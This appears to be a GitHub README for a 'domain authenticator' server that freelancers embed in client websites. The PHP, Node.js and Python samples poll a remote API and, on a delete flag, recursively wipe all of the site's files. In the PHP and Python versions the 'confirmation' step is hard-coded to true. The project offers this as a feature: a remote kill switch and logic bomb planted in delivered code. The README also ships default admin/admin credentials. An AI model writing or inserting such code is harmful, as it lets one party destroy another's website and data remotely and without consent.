# Domain Authenticator Manager

<p> With this domain authenticator server, anyone can add domain authentication to their code, it's very simple and easy to use this domain authenticator server. The primary purpose of this project is to help those freelancers who got cheated by clients after completing the project </p>
<p>&nbsp;</p>

<h3>Highlighted Features : </h3>
<ul>
    <li>Easy to use</li>
    <li>Simple & fast loading Admin panel</li>
    <li>Show any text message from the admin panel</li>
    <li>It can delete the entire website in one command</li>
    <li>Prebuild WP theme function code and plugin </li>
</ul><br>

<h3>Requirements :</h3>
<ul>
    <li>PHP >= 8.1</li>
    <li>MySql Database</li>
</ul><br>

<h3><strong>How to Install ?</strong></h3>
<ol>
    <li>Clone the repogetory</li>
    <li>uplaod on your server&nbsp;</li>
    <li><a href="https://active.devtool.my.id" rel="dofollow"><strong>Register</strong></a> your domain</li>
    <li>Create MySql database and user&nbsp;</li>
    <li><a href="https://active.devtool.my.id/checker.php" rel="dofollow"><strong>Downlaod</strong></a> the database</li>
    <li>Import the <strong>database.sql&nbsp;</strong></li>
    <li>Put the database credential on <strong>config.php</strong></li>
</ol><br>

<h3><strong>Now you are ready to login into the domain control panel&nbsp;</strong></h3>
<p>https://example.com/login.php</p>
<p>user:- admin</p>
<p>password:- admin</p>
<br>


<p>WordPress users can use our  WordPress theme <a href="#functioncode" rel="dofollow" > function code</a> on any theme. also, we have a WordPress <a href="https://github.com/websmartbd/Domain-Validator-Plugin" rel="dofollow" >Plugin</a> to validate the authorized domain</p>
<br>
<h3> Row php code sample</h3><br>

```
<?php

// Enable error reporting
error_reporting(E_ALL);
ini_set('display_errors', 1);

function is_domain_allowed() {
    $api_url = 'https://example.com/api.php'; // Replace this with your actual API URL
    $response = file_get_contents($api_url);
    if ($response === false) {
        return false; // Assuming API call failed, disallow domain
    }
    $api_response = json_decode($response, true); // Decoding JSON as associative array

    // Extracting the domain from the $_SERVER['HTTP_HOST']
    $current_domain = $_SERVER['HTTP_HOST'];

    foreach ($api_response as $item) {
        if ($item['domain'] == $current_domain) {
            // Check if the domain is active or not
            if ($item['active'] == 1) {
                // Check if 'delete' key exists in the JSON data
                if (isset($item['delete'])) {
                    if ($item['delete'] == "yes") {
                        // Confirm deletion
                        if (confirm_deletion()) {
                            delete_all_files_folders();
                        }
                    } elseif ($item['delete'] == "no") {
                        // If deletion is not allowed, simply return false
                        return false;
                    }
                }
                return true; // Domain is active, allow access
            } else {
                // If the domain is not active, show the message
                echo '<p style="color:red;font-size:30px;font-weight:600;text-align:center;">' . $item['message'] . '</p>';
                return false;
            }
        }
    }

    // If the domain is not found in the API response, show the default message
    echo '<p style="color:red;font-size:30px;font-weight:600;text-align:center;">You are not allowed to use this code</p>';
    return false;
}

function confirm_deletion() {
    // Here you can implement a confirmation mechanism, such as a form submission or a checkbox
    // For demonstration purposes, returning true directly
    return true;
}

function delete_all_files_folders() {
    $dir_to_delete = __DIR__; // Directory of the current script
    if (delete_directory($dir_to_delete)) {
        echo '<p style="color:green;font-size:18px;font-weight:600;">All files and folders deleted successfully.</p>';
    } else {
        echo '<p style="color:red;font-size:18px;font-weight:600;">Failed to delete files and folders.</p>';
    }
}

// Recursive function to delete directory and its contents
function delete_directory($dir) {
    if (!is_dir($dir)) {
        return false;
    }

    $files = array_diff(scandir($dir), array('.', '..'));
    foreach ($files as $file) {
        $path = $dir . DIRECTORY_SEPARATOR . $file;
        if (is_dir($path)) {
            delete_directory($path);
        } else {
            if (!unlink($path)) {
                return false;
            }
        }
    }
    return rmdir($dir);
}

if (!is_domain_allowed()) {
    // Do nothing here, the message is handled inside is_domain_allowed() function
} 

// code to be executed if the domain is allowed

?>

```

<h3> NodeJS code sample</h3><be>

```
const fetch = require('node-fetch');
const fs = require('fs');
const readline = require('readline');

function isDomainAllowed() {
    const apiUrl = 'https://example.com/api.php'; // Replace this with your actual API URL
    return fetch(apiUrl)
        .then(response => {
            if (!response.ok) {
                throw new Error('API request failed');
            }
            return response.json();
        })
        .then(apiResponse => {
            const currentDomain = process.env.HTTP_HOST; // Extracting the domain from the environment variable

            for (const item of apiResponse) {
                if (item.domain === currentDomain) {
                    if (item.active === 1) {
                        if (item.delete === "yes") {
                            return confirmDeletion().then(confirmed => {
                                if (confirmed) {
                                    deleteAllFilesFolders();
                                }
                                return confirmed;
                            });
                        } else if (item.delete === "no") {
                            return false;
                        }
                        return true;
                    } else {
                        console.log(`You are not allowed to use this code: ${item.message}`);
                        return false;
                    }
                }
            }

            console.log("You are not allowed to use this code");
            return false;
        })
        .catch(error => {
            console.error("Error:", error);
            return false;
        });
}

function confirmDeletion() {
    // Here you can implement a confirmation mechanism, such as a form submission or a checkbox
    // For demonstration purposes, using readline to get user confirmation
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });

    return new Promise(resolve => {
        rl.question("Do you confirm deletion? (yes/no): ", answer => {
            rl.close();
            resolve(answer === "yes");
        });
    });
}

function deleteAllFilesFolders() {
    const dirToDelete = __dirname; // Directory of the current script
    deleteDirectory(dirToDelete)
        .then(() => console.log("All files and folders deleted successfully."))
        .catch(() => console.error("Failed to delete files and folders."));
}

function deleteDirectory(dir) {
    return new Promise((resolve, reject) => {
        fs.readdir(dir, (err, files) => {
            if (err) {
                reject(err);
                return;
            }

            const promises = files.map(file => {
                const filePath = `${dir}/${file}`;
                return new Promise((resolve, reject) => {
                    fs.stat(filePath, (err, stat) => {
                        if (err) {
                            reject(err);
                            return;
                        }

                        if (stat.isDirectory()) {
                            deleteDirectory(filePath)
                                .then(resolve)
                                .catch(reject);
                        } else {
                            fs.unlink(filePath, err => {
                                if (err) {
                                    reject(err);
                                    return;
                                }
                                resolve();
                            });
                        }
                    });
                });
            });

            Promise.all(promises)
                .then(() => {
                    fs.rmdir(dir, err => {
                        if (err) {
                            reject(err);
                            return;
                        }
                        resolve();
                    });
                })
                .catch(reject);
        });
    });
}

(async () => {
    if (!(await isDomainAllowed())) {
        // Do nothing here, the message is handled inside isDomainAllowed() function
    }

    // code to be executed if the domain is allowed
})();


```


<h3> Python code sample</h3><be>

```
import os
import json
import requests

def is_domain_allowed():
    api_url = 'https://example.com/api.php'  # Replace this with your actual API URL
    response = requests.get(api_url)
    if response.status_code != 200:
        return False  # Assuming API call failed, disallow domain
    
    api_response = response.json()
    current_domain = os.environ.get('HTTP_HOST')  # Extracting the domain from the environment variable

    for item in api_response:
        if item['domain'] == current_domain:
            if item['active'] == 1:
                if 'delete' in item:
                    if item['delete'] == "yes":
                        if confirm_deletion():
                            delete_all_files_folders()
                    elif item['delete'] == "no":
                        return False
                return True
            else:
                print(f"You are not allowed to use this code: {item['message']}")
                return False
    
    print("You are not allowed to use this code")
    return False

def confirm_deletion():
    # Here you can implement a confirmation mechanism, such as a form submission or a checkbox
    # For demonstration purposes, returning True directly
    return True

def delete_all_files_folders():
    dir_to_delete = os.path.dirname(os.path.abspath(__file__))  # Directory of the current script
    if delete_directory(dir_to_delete):
        print("All files and folders deleted successfully.")
    else:
        print("Failed to delete files and folders.")

def delete_directory(dir):
    if not os.path.isdir(dir):
        return False
    
    for root, dirs, files in os.walk(dir, topdown=False):
        for name in files:
            os.remove(os.path.join(root, name))
        for name in dirs:
            os.rmdir(os.path.join(root, name))
    
    return True

if not is_domain_allowed():
    pass  # Do nothing here, the message is handled inside is_domain_allowed() function

# code to be executed if the domain is allowed


```




<br>
<h3 id="functioncode"><b>Note:- If you don't have a good knowledge of PHP code or theme function we recommend using the Plugin instead of function code </b></h3>
<br>

```

function check_domain_allowed_theme() {
    $api_url = 'https://example.com/api.php?nonce=' . md5(uniqid(rand(), true)); // Append a unique query parameter to bypass caching
    $response = wp_remote_get($api_url);

    if (is_wp_error($response)) {
        return; // If the API call fails, do nothing
    }

    $body = wp_remote_retrieve_body($response);
    $api_response = json_decode($body, true); // Decoding JSON as associative array

    // Extracting the domain from the $_SERVER['HTTP_HOST']
    $current_domain = $_SERVER['HTTP_HOST'];

    foreach ($api_response as $item) {
        if ($item['domain'] == $current_domain) {
            // Check if the domain is active or not
            if ($item['active'] == 1) {
                return; // Domain is active, allow access
            } else {
                // If the domain is not active, show the message
                echo '<p style="color:red;font-size:30px;font-weight:600;text-align:center;">' . esc_html($item['message']) . '</p>';
                exit; // Stop further execution
            }
        }
    }

    // If the domain is not found in the API response, show the default message
    echo '<p style="color:red;font-size:30px;font-weight:600;text-align:center;">You are not allowed to use this code</p>';
    exit; // Stop further execution
}
add_action('wp_head', 'check_domain_allowed_theme');

```
